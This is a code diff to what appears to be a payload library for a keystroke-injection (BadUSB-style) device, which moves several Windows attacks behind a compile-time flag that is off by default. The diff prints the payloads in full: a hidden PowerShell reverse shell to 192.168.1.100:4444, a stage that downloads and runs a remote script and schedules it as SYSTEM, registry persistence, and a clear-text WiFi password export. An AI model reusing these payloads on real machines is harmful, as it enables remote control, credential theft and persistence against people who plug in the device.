@@ -10,6 +10,10 @@ struct Payload {
     const char* description;
 };
 
+#ifndef ENABLE_DANGEROUS_PAYLOADS
+#define ENABLE_DANGEROUS_PAYLOADS 0
+#endif
+
 // ==================== WINDOWS PAYLOADS ====================
 
 const Payload windowsPayloads[] = {
@@ -22,11 +26,6 @@ const Payload windowsPayloads[] = {
         "Win: PowerShell",
         "DELAY 1000\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500",
         "Öffnet PowerShell"
-    },
-    {
-        "Win: Reverse Shell",
-        "DELAY 2000\nGUI r\nDELAY 300\nSTRING powershell -w h -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\nENTER",
-        "PowerShell Reverse Shell"
     },
     {
         "Win: System Info",
@@ -42,6 +41,12 @@ const Payload windowsPayloads[] = {
         "Win: WiFi Passwords",
         "DELAY 1000\nGUI r\nDELAY 300\nSTRING cmd\nENTER\nDELAY 500\nSTRING netsh wlan show profiles\nENTER\nDELAY 2000\nSTRING netsh wlan export profile key=clear\nENTER",
         "Zeigt gespeicherte WiFi Passwörter"
+    }
+#if ENABLE_DANGEROUS_PAYLOADS
+    ,{
+        "Win: Reverse Shell",
+        "DELAY 2000\nGUI r\nDELAY 300\nSTRING powershell -w h -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\nENTER",
+        "PowerShell Reverse Shell"
     },
     {
         "Win: UAC Bypass",
@@ -53,6 +58,7 @@ const Payload windowsPayloads[] = {
         "DELAY 1000\nGUI r\nDELAY 300\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f\nENTER",
         "Fügt Persistence via Registry hinzu"
     }
+#endif
 };
 
 // ==================== BLUETOOTH PAYLOADS ====================
@@ -88,11 +94,13 @@ const Payload wifiPayloads[] = {
 // ==================== KOMBINIERTE PAYLOADS ====================
 
 const Payload combinedPayloads[] = {
+#if ENABLE_DANGEROUS_PAYLOADS
     {
         "APT Simulation",
         "DELAY 2000\nGUI r\nSTRING powershell -w h -nop -c \"iwr http://192.168.1.100/stage1.ps1 -OutFile $env:TEMP\\s1.ps1; .$env:TEMP\\s1.ps1\"\nENTER\nDELAY 5000\nSTRING schtasks /create /tn SystemHealth /tr 'powershell -w h -file $env:TEMP\\s1.ps1' /sc hourly /mo 1 /ru SYSTEM\nENTER",
         "Multi-Stage APT Simulation"
     }
+#endif
 };
 
 // ==================== GESAMTLISTE ====================
